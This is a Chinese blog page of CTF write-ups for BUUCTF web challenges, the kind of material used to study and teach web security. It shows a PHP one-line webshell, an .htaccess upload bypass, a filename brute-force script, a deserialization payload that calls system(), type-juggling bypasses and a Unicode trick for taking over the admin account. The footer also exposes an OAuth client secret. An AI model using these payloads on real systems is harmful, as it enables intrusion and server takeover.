@@ -1,0 +1,670 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>在BUU做过的一些题 | white0123</title>
+<link rel="shortcut icon" href="https://wghahaha.github.io/favicon.ico?v=1714286336284">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://wghahaha.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="在BUU做过的一些题 | white0123 - Atom Feed" href="https://wghahaha.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="前言：
+基本上每天都会更新一到三道题目，大部分题目来源于BUUCTF,部分题目由于自身知识水平有限，借鉴了师傅们的文章，如有侵权，可以联系我删除。
+2017-赛客夏令营-Web-Uploadddd
+我们进入题目发现是文件上传框。我们直接上传..." />
+    <meta name="keywords" content="靶场" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://wghahaha.github.io">
+  <img class="avatar" src="https://wghahaha.github.io/images/avatar.png?v=1714286336284" alt="">
+  </a>
+  <h1 class="site-title">
+    white0123
+  </h1>
+  <p class="site-description">
+    永远保持第一天接触网络安全的热情
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              在BUU做过的一些题
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-01-17
+              </span>
+              <span>
+                18 min read
+              </span>
+              
+                <a href="https://wghahaha.github.io/tag/yQKENPFNg/" class="post-tag">
+                  # 靶场
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <p>前言：<br>
+基本上每天都会更新一到三道题目，大部分题目来源于BUUCTF,部分题目由于自身知识水平有限，借鉴了师傅们的文章，如有侵权，可以联系我删除。</p>
+<h5 id="2017-赛客夏令营-web-uploadddd">2017-赛客夏令营-Web-Uploadddd</h5>
+<p>我们进入题目发现是文件上传框。我们直接上传一句话木马。提示上传成功</p>
+<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230117203921187.png" alt="image-20230117203921187" loading="lazy"></figure>
+<p>但是没有上传路径，我以为是开发者虚晃我的。</p>
+<p>我接着上传了正常的jpg文件，还是提示上传成功且没有路径。</p>
+<p>我们就开始找上传路径，可以直接使用dirmap,然后找到了一个<mark>index.php.swp</mark>.文件。</p>
+<p>使用vim打开，可以看到代码</p>
+<pre><code class="language-php">&lt;?php
+if (isset($_POST['submit'])){
+    $file_path = &quot;uploads/&quot;;
+    $file_name = date(&quot;YmdHis&quot;) . rand(0,999) . &quot;.php&quot;;
+    move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], $file_path . $file_name);
+    echo &quot;上传成功!&quot;;
+}
+
+?&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;title&gt;Web03&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;form action=&quot;index.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
+        &lt;input type=&quot;file&quot; name='file'&gt; 
+        &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;上传&quot; /&gt; 
+    &lt;/form&gt; 
+&lt;/body&gt; 
+&lt;/html&gt;
+
+
+</code></pre>
+<p>代码审计这一段</p>
+<pre><code class="language-php">&lt;?php
+if (isset($_POST['submit'])){
+    $file_path = &quot;uploads/&quot;;
+    $file_name = date(&quot;YmdHis&quot;) . rand(0,999) . &quot;.php&quot;;
+    move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], $file_path . $file_name);
+    echo &quot;上传成功!&quot;;
+}
+
+?&gt;
+</code></pre>
+<p>可以看到v上传的路径为 uploads下的文件名为上传的时间加上随机数和php后缀</p>
+<p>python脚本暴破</p>
+<pre><code class="language-python">from requests import *
+info = ''
+for i in range(0,1000):
+    url = 'http://challenge-93448b82e03a3bab.sandbox.ctfhub.com:10800/uploads/20230117122037' + str(i) + '.php'
+    resp = get(url)
+    print(url+&quot;----&quot;+str(resp.status_code))
+    if resp.status_code == 200:
+        break
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230117204754153.png" alt="image-20230117204754153" loading="lazy"></figure>
+<p>找到文件上传路径。</p>
+<p>连接蚁剑得到flag</p>
+<figure data-type="image" tabindex="3"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230117204918821.png" alt="image-20230117204918821" loading="lazy"></figure>
+<h5 id="bjdctf2020easy-md5">[BJDCTF2020]Easy MD5</h5>
+<p>首先我们只看到了一个输入框，就没有其他的信息了。我们随便输入数据。然后配合burp抓包处理。然后通过我们的观察(仔细观察)可以看到有一个存在hint模块的地方</p>
+<figure data-type="image" tabindex="4"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20221114174444691.png" alt="image-20221114174444691" loading="lazy"></figure>
+<p>这里就是将数据带入进去了</p>
+<p>然后我们在输入框输入万能密码<mark>ffifdyop</mark></p>
+<p>这是关于一个md5方面的万能密码，我们可以通过这篇博客得到了解</p>
+<p>https://www.cnblogs.com/tqing/p/11852990.html</p>
+<p>这里我们可以看到一个新的界面</p>
+<figure data-type="image" tabindex="5"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20221114174732051.png" alt="image-20221114174732051" loading="lazy"></figure>
+<p>然后我们查看页面源代码</p>
+<figure data-type="image" tabindex="6"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20221114174814774.png" alt="image-20221114174814774" loading="lazy"></figure>
+<p>这里又用到了我们的MD5碰撞与弱口令。<br>
+构建参数a=s878926199a&amp;b=s155964671a成功进入了下一个界面</p>
+<p>然后我们又可以看到一个新的界面</p>
+<figure data-type="image" tabindex="7"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20221114174921251.png" alt="image-20221114174921251" loading="lazy"></figure>
+<p>这里就直接把源码给我们了。我们可以直接在这里搞一个数组绕过就可以了。网上很多博客讲的都是用 <mark>hackber</mark>但是我那个插件一直都没有配置好，所以我这里用的是<mark>burp</mark>进行操作。原理一样</p>
+<p>我们还是发送到<mark>repeater</mark>模块然后<mark>改变请求方式</mark></p>
+<p>最后发送就可以了。</p>
+<figure data-type="image" tabindex="8"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20221114175345467.png" alt="image-20221114175345467" loading="lazy"></figure>
+<h5 id="网鼎杯-2020-朱雀组phpweb1">[网鼎杯 2020 朱雀组]phpweb1</h5>
+<p>我们进入题目链接的靶场，发现网页一直在刷新。题目带有 php 感觉会和代码审计有关系。</p>
+<p>查看源代码，也没有发现什么提示，但是看到两个变量。</p>
+<pre><code class="language-php+HTML">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;phpweb&lt;/title&gt;
+    &lt;style type=&quot;text/css&quot;&gt;
+        body {
+            background: url(&quot;bg.jpg&quot;) no-repeat;
+            background-size: 100%;
+        }
+        p {
+            color: white;
+        }
+    &lt;/style&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+&lt;script language=javascript&gt;
+    setTimeout(&quot;document.form1.submit()&quot;,5000)
+&lt;/script&gt;
+&lt;p&gt;
+    &lt;br /&gt;
+&lt;b&gt;Warning&lt;/b&gt;:  date(): It is not safe to rely on the system's timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected the timezone 'UTC' for now, but please set date.timezone to select your timezone. in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;24&lt;/b&gt;&lt;br /&gt;
+2023-01-18 01:58:00 am&lt;/p&gt;
+&lt;form  id=form1 name=form1 action=&quot;index.php&quot; method=post&gt;
+    &lt;input type=hidden id=func name=func value='date'&gt;
+    &lt;input type=hidden id=p name=p value='Y-m-d h:i:s a'&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+</code></pre>
+<p>然后打开hackbar发现确实是这两个变量进行POST传输参数。</p>
+<figure data-type="image" tabindex="9"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230118102713309.png" alt="image-20230118102713309" loading="lazy"></figure>
+<p>然后打开burp改变传入值。(也可以用hack bar我喜欢看一下完整的数据包）。</p>
+<p>注意：我们在传输参数前需要分析每个变量传入的值是什么类型。func这个单词多用于定义函数。加上传入value为 date，所以猜测func需要传入的是一个函数名。p同理分析感觉传入的是一个普通的变量。</p>
+<p>我们尝试对一个字符串进行md5加密</p>
+<figure data-type="image" tabindex="10"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230118103559665.png" alt="image-20230118103559665" loading="lazy"></figure>
+<p>字符串成功被加密。</p>
+<p>接着我们尝试ls一下目录。</p>
+<p>func=system&amp;p=ls，但是显示hacking，应该是被过滤掉了。</p>
+<p>我们尝试读取一下源码</p>
+<pre><code>func=file_get_contents&amp;p=php://filter/read=convert.base64-encode/resource=index.php
+</code></pre>
+<p>注意，读取出来的字符串我是经过了base64加密的，所以需要放到工具里解下密</p>
+<p>最终源码</p>
+<pre><code class="language-php+HTML">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;phpweb&lt;/title&gt;
+    &lt;style type=&quot;text/css&quot;&gt;
+        body {
+            background: url(&quot;bg.jpg&quot;) no-repeat;
+            background-size: 100%;
+        }
+        p {
+            color: white;
+        }
+    &lt;/style&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+&lt;script language=javascript&gt;
+    setTimeout(&quot;document.form1.submit()&quot;,5000)
+&lt;/script&gt;
+&lt;p&gt;
+    &lt;?php
+    $disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;);
+    function gettime($func, $p) {
+        $result = call_user_func($func, $p);
+        $a= gettype($result);
+        if ($a == &quot;string&quot;) {
+            return $result;
+        } else {return &quot;&quot;;}
+    }
+    class Test {
+        var $p = &quot;Y-m-d h:i:s a&quot;;
+        var $func = &quot;date&quot;;
+        function __destruct() {
+            if ($this-&gt;func != &quot;&quot;) {
+                echo gettime($this-&gt;func, $this-&gt;p);
+            }
+        }
+    }
+    $func = $_REQUEST[&quot;func&quot;];
+    $p = $_REQUEST[&quot;p&quot;];
+
+    if ($func != null) {
+        $func = strtolower($func);
+        if (!in_array($func,$disable_fun)) {
+            echo gettime($func, $p);
+        }else {
+            die(&quot;Hacker...&quot;);
+        }
+    }
+    ?&gt;
+&lt;/p&gt;
+&lt;form  id=form1 name=form1 action=&quot;index.php&quot; method=post&gt;
+    &lt;input type=hidden id=func name=func value='date'&gt;
+    &lt;input type=hidden id=p name=p value='Y-m-d h:i:s a'&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+</code></pre>
+<p>我们发现一个函数很熟悉。</p>
+<pre><code class="language-php">function __destruct() {
+            if ($this-&gt;func != &quot;&quot;) {
+                echo gettime($this-&gt;func, $this-&gt;p);
+            }
+        }
+</code></pre>
+<p>在反序列化中我们知道了这个函数的应用场景。此函数会在类被销毁时调用，那我们如果反序列化一个类，在类里的参数中写上我们要执行的代码和函数，这样的话就会直接调用gettime函数，而不会执行in_array(<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>f</mi><mi>u</mi><mi>n</mi><mi>c</mi><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">func,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault">u</span><span class="mord mathdefault">n</span><span class="mord mathdefault">c</span><span class="mpunct">,</span></span></span></span>disable_fun)，那我们就绕过了黑名单的判断，func=unserialize&amp;p=O:4:&quot;Test&quot;:2:{s:1:&quot;p&quot;;s:2:&quot;ls&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;}。</p>
+<figure data-type="image" tabindex="11"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230118105105244.png" alt="image-20230118105105244" loading="lazy"></figure>
+<p>成功，现在找一下flag的路径</p>
+<pre><code class="language-php+HTML">func=unserialize&amp;p=O:4:&quot;Test&quot;:2:{s:1:&quot;p&quot;;s:18:&quot;find+/+-name+flag*&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;}
+</code></pre>
+<figure data-type="image" tabindex="12"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230118105256853.png" alt="image-20230118105256853" loading="lazy"></figure>
+<p>然后读取 flag</p>
+<figure data-type="image" tabindex="13"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230118105359625.png" alt="image-20230118105359625" loading="lazy"></figure>
+<h5 id="极客大挑战-2019php1">[极客大挑战 2019]PHP1</h5>
+<p>题目是php猜测于代码审计有关系。</p>
+<p>打开地址，发现没有办法查看源代码，题目提示备份网站，根据以前的经验来看会有一个压缩包。</p>
+<p>使用kali的 dirsearch 可以扫到一个 www.zip的压缩包 大概率就是这个（路径比较多，大家耐心找一下）</p>
+<p>然后在后面后面加入 www.zip</p>
+<p>成功下载，解压出来有三个php文件。</p>
+<p>打开进行代码审计。</p>
+<p><strong>index.php</strong></p>
+<pre><code class="language-php">    &lt;?php
+    include 'class.php';
+    $select = $_GET['select'];
+    $res=unserialize(@$select);
+    ?&gt;
+
+</code></pre>
+<p><strong>class.php</strong></p>
+<pre><code class="language-php">&lt;?php
+include 'flag.php';
+
+
+error_reporting(0);
+
+
+class Name{
+    private $username = 'nonono';
+    private $password = 'yesyes';
+
+    public function __construct($username,$password){
+        $this-&gt;username = $username;
+        $this-&gt;password = $password;
+    }
+
+    function __wakeup(){
+        $this-&gt;username = 'guest';
+    }
+
+    function __destruct(){
+        if ($this-&gt;password != 100) {
+            echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;
+            echo &quot;You name is: &quot;;
+            echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;
+            echo &quot;You password is: &quot;;
+            echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;
+            die();
+        }
+        if ($this-&gt;username === 'admin') {
+            global $flag;
+            echo $flag;
+        }else{
+            echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can't give you the flag!&quot;;
+            die();
+
+            
+        }
+    }
+}
+?&gt;
+</code></pre>
+<p>首先看index.php的代码，发现通过GET方式传入一个 select的值，加上有一个unserialize函数，那么select的值就需要经过序列化。</p>
+<p>头文件包含了 class.php 再阅读一下 class.php 。这段代码是输出 flag的关键。</p>
+<pre><code class="language-php"> function __destruct(){
+        if ($this-&gt;password != 100) {
+            echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;
+            echo &quot;You name is: &quot;;
+            echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;
+            echo &quot;You password is: &quot;;
+            echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;
+            die();
+        }
+        if ($this-&gt;username === 'admin') {
+            global $flag;
+            echo $flag;
+        }else{
+            echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can't give you the flag!&quot;;
+            die();
+
+            
+        }
+    }
+</code></pre>
+<p>通过代码审计，我们发现当输入 的password =100 且 username = admin 时，可以正常输出 flag.</p>
+<p>编写 php序列化代码得到初步payload</p>
+<pre><code class="language-php">&lt;?php
+
+class Name{
+    private $username = 'nonono';
+    private $password = 'yesyes';
+
+    public function __construct($username,$password){
+        $this-&gt;username = $username;
+        $this-&gt;password = $password;
+    }
+}
+$a = new Name('admin', 100);
+echo (serialize($a));
+
+?&gt;
+</code></pre>
+<pre><code class="language-php">O:4:&quot;Name&quot;:2:{s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;}
+</code></pre>
+<p>我还说真简单，我直接拿这个去得flag了，结果失败了。。。</p>
+<p>原来是还有 wakeup()这个魔术方法，这部分的绕过还不太会，就去网上找的师傅的WP看的。</p>
+<p>大概意思就是 属性个数的值大于实际属性个数时，会跳过 __wakeup()函数的执行</p>
+<p>就只需要将 序列化后的值改成这样就可以了</p>
+<pre><code class="language-php">O:4:&quot;Name&quot;:3:{s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;}
+</code></pre>
+<p>师傅还指出我的一个问题，就是 private 声明的字段为私有字段，只在所声明的类中可见。</p>
+<ul>
+<li>private声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。</li>
+<li>因此私有字段的字段名在序列化时，类名和字段名前面都会加上\0（即%00）的前缀。字符串长度也包括所加前缀的长度。</li>
+</ul>
+<pre><code class="language-php">O:4:&quot;Name&quot;:3:{s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;}
+</code></pre>
+<p>然后通过GET传入select 的值。</p>
+<figure data-type="image" tabindex="14"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230118213854664.png" alt="image-20230118213854664" loading="lazy"></figure>
+<p>得到 flag。</p>
+<p>这道题是一道反序列化的题目难点在于绕过wakeup函数，后来通过看 网上师傅的绕过方式，才知道绕过方式。后面的私钥主要就是考的细心和知识的广度了。</p>
+<h5 id="mrctf2020你传你呢1">[MRCTF2020]你传你🐎呢1</h5>
+<p>一道简单的文件上传题目，本来不想写的，但是还是写一下吧，可以加深一下对htacss文件的理解</p>
+<p>首先是一个文件上传框，我们直接上传一句话木马 shell.php 文件。发现无法正常上传。猜测会不会是前端或者MIME验证。发现还是无法正常上传php文件。那么就考虑用htacss配置文件。</p>
+<p>上传.htacss 文件。文件里的内容如下</p>
+<pre><code class="language-php">&lt;FilesMatch &quot;666.png&quot;&gt;
+SetHandler application/x-httpd-php
+&lt;/FilesMatch&gt;
+</code></pre>
+<p>这个文件的作用就是将png解析为php</p>
+<p>然后php抓包 MIME绕过。将 content-type 字段改为 image/png (其他合法的也可以。)</p>
+<p>发现成功上传。</p>
+<figure data-type="image" tabindex="15"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230119220309956.png" alt="image-20230119220309956" loading="lazy"></figure>
+<p>上传 666.png 文件，文件里写入一句话木马。</p>
+<pre><code class="language-php">&lt;?php @eval($_POST['shell']);?&gt;
+</code></pre>
+<p>成功上传。</p>
+<figure data-type="image" tabindex="16"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230119220435846.png" alt="image-20230119220435846" loading="lazy"></figure>
+<p>需要注意的是 文件上传后的路径不是直接在 url后粘贴回显的路径，而是从 upload 开始</p>
+<p>比如我的路径应该是</p>
+<pre><code class="language-php">/upload/7b2b7b4e1be01f2bcbfdda21046f83a6/666.png
+</code></pre>
+<p>拼接在url后发现并没有报错。</p>
+<p>然后连接蚁剑 找到 flag</p>
+<figure data-type="image" tabindex="17"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230119220822423.png" alt="image-20230119220822423" loading="lazy"></figure>
+<h5 id="极客大挑战-2019buyflag1">[极客大挑战 2019]BuyFlag1</h5>
+<p>这道题主要是伪造数据包。</p>
+<p>进入环境后，点击菜单 发现一个 payflag，点进去发现一系列的要求 （虽然全是英文，但是我大概还是看懂了。）</p>
+<figure data-type="image" tabindex="18"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230120111130459.png" alt="image-20230120111130459" loading="lazy"></figure>
+<p>大概意思就是 需要验证我的身份是不是CUIT(成信大 ) 的学生 然后要输入正确的password 。但是这些信息还是有限 ，我们查看下源码。</p>
+<p>发现一段被注释掉的代码。</p>
+<figure data-type="image" tabindex="19"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230120111403107.png" alt="image-20230120111403107" loading="lazy"></figure>
+<p>代码分析</p>
+<p>需要通过POST传入 money 和 password 的值。</p>
+<p>password 有一个弱类型匹配绕过</p>
+<pre><code class="language-php">if (isset($_POST['password'])) {
+	$password = $_POST['password'];
+	if (is_numeric($password)) {
+		echo &quot;password can't be number&lt;/br&gt;&quot;;
+	}elseif ($password == 404) {
+		echo &quot;Password Right!&lt;/br&gt;&quot;;
+	}
+}
+</code></pre>
+<p>绕过分析</p>
+<p>money这里，我没有找到提示信息，大概应该是在后面输入金钱的数额。这里我先直接输的一千万。</p>
+<p>还有一个password 关于这个弱类型匹配绕过网上有很多博客讲解的，这里我是直接在设为 404aaaaa</p>
+<p>payload</p>
+<pre><code class="language-php">password=404aaaaa&amp;money=10000000
+</code></pre>
+<p>抓取数据包 发现 cookie 有一个 user 默认为0 根据逻辑绕过的一些知识，猜测这里可能是验证成信大学生的地方。</p>
+<p>一般 1为真 0为假。将值改为1</p>
+<p>然后注意的是 请求方式修改为 POST 最后传递参数 发包</p>
+<figure data-type="image" tabindex="20"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230120112503512.png" alt="image-20230120112503512" loading="lazy"></figure>
+<p>返回数值太长。</p>
+<p>用科学计数法尝试一下。</p>
+<figure data-type="image" tabindex="21"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230120112625840.png" alt="image-20230120112625840" loading="lazy"></figure>
+<p>成功得到 flag</p>
+<p>这道题考的还是比较简单，难点在于php的弱类型匹配绕过。</p>
+<h5 id="hctf-2018admin1">[HCTF 2018]admin1</h5>
+<p>前言：<br>
+今天是大年三十一但是还是不可以忘记学习，哈哈哈。</p>
+<p>我们进入环境后，会看到有注册和登录框，我们尝试注册一个账号。然后进行登录</p>
+<figure data-type="image" tabindex="22"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230121104729229.png" alt="image-20230121104729229" loading="lazy"></figure>
+<p>然后查看下点击不同的选项，然后查看源代码。</p>
+<figure data-type="image" tabindex="23"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230121104819656.png" alt="image-20230121104819656" loading="lazy"></figure>
+<p>在当前页面查看源代码，发现提示，代表着可能想得到flag需要通过admin进行登录。</p>
+<figure data-type="image" tabindex="24"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230121104935553.png" alt="image-20230121104935553" loading="lazy"></figure>
+<p>在更改密码的界面查看，发现github的一个网址。打开链接下载源码。</p>
+<p>代码审计 ，这道题的解法有很多 很多都是通过伪造session的方法做的，但是对于新手来说，有点麻烦，我在这里介绍一种最简单的方法</p>
+<p>unicode编码覆盖绕过</p>
+<p>审计route.py</p>
+<pre><code class="language-python">@app.route('/register', methods = ['GET', 'POST'])
+def register():
+ 
+    if current_user.is_authenticated:
+        return redirect(url_for('index'))
+ 
+    form = RegisterForm()
+    if request.method == 'POST':
+        name = strlower(form.username.data)
+        if session.get('image').lower() != form.verify_code.data.lower():
+            flash('Wrong verify code.')
+            return render_template('register.html', title = 'register', form=form)
+        if User.query.filter_by(username = name).first():
+            flash('The username has been registered')
+            return redirect(url_for('register'))
+        user = User(username=name)
+        user.set_password(form.password.data)
+        db.session.add(user)
+        db.session.commit()
+        flash('register successful')
+        return redirect(url_for('login'))
+    return render_template('register.html', title = 'register', form = form)
+ 
+@app.route('/login', methods = ['GET', 'POST'])
+def login():
+    if current_user.is_authenticated:
+        return redirect(url_for('index'))
+ 
+    form = LoginForm()
+    if request.method == 'POST':
+        name = strlower(form.username.data)
+        session['name'] = name
+        user = User.query.filter_by(username=name).first()
+        if user is None or not user.check_password(form.password.data):
+            flash('Invalid username or password')
+            return redirect(url_for('login'))
+        login_user(user, remember=form.remember_me.data)
+        return redirect(url_for('index'))
+    return render_template('login.html', title = 'login', form = form)
+ 
+def strlower(username):
+    username = nodeprep.prepare(username)
+    return username
+</code></pre>
+<p>在login和register函数中，均对传参username进行了strlower处理，查看下面的函数，是对username调用函数nodeprep.prepare进行处理，unicode转化，而nodeprep是从Twisted模块导入的，在requirements.txt文件中发现Twisted==10.2.0，与最新版本差距很大，</p>
+<p>注册和登录各调用了一次这个函数，我们倒着进行推算，要使传进去的值服务器识别成admin,</p>
+<p>函数的作用是将大写转化为小写</p>
+<p>但它同时会将unicode字符ᴬ转换成A，而A再调用一次nodeprep.prepare函数会把A转换成a,</p>
+<p>所以我们只需要注册一个新的用户 用户名为 ᴬdmin 然后登录进去发现为Admin</p>
+<figure data-type="image" tabindex="25"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230121110102237.png" alt="image-20230121110102237" loading="lazy"></figure>
+<p>然后修改密码</p>
+<p>然后用admin账户名和修改后的密码进行登录，可以得到flag。</p>
+<figure data-type="image" tabindex="26"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230121110301734.png" alt="image-20230121110301734" loading="lazy"></figure>
+<p>这道题虽然用这种方法可以轻松获得flag但是想完全理解还是需要自己下来花时间去理解。</p>
+<p>这里推荐一下这道题的其他解法的博客</p>
+<p>https://blog.csdn.net/weixin_44214568/article/details/123454960</p>
+<p>https://www.anquanke.com/post/id/164086</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li>
+<ul>
+<li>
+<ul>
+<li>
+<ul>
+<li><a href="#2017-%E8%B5%9B%E5%AE%A2%E5%A4%8F%E4%BB%A4%E8%90%A5-web-uploadddd">2017-赛客夏令营-Web-Uploadddd</a></li>
+<li><a href="#bjdctf2020easy-md5">[BJDCTF2020]Easy MD5</a></li>
+<li><a href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84phpweb1">[网鼎杯 2020 朱雀组]phpweb1</a></li>
+<li><a href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019php1">[极客大挑战 2019]PHP1</a></li>
+<li><a href="#mrctf2020%E4%BD%A0%E4%BC%A0%E4%BD%A0%E5%91%A21">[MRCTF2020]你传你🐎呢1</a></li>
+<li><a href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019buyflag1">[极客大挑战 2019]BuyFlag1</a></li>
+<li><a href="#hctf-2018admin1">[HCTF 2018]admin1</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://wghahaha.github.io/post/ctf-hub-ji-neng-shu-zhi-wen-jian-shang-chuan/">
+              <h3 class="post-title">
+                CTF hub 技能树之文件上传
+              </h3>
+            </a>
+          </div>
+        
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '60a6742bb0cdc1129286',
+    clientSecret: '2c932a185a0c37b7924302f1ab242ffd3c186641',
+    repo: 'wghahaha.github.io',
+    owner: 'wghahaha',
+    admin: ['wghahaha'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  <div>
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	<span id="busuanzi_container_site_uv" style='display:none'>总访客人数量<span id="busuanzi_value_site_uv"></span>次</span>
+	<span id="busuanzi_container_site_pv" style='display:none'>本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+</div>
+  <a class="rss" href="https://wghahaha.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
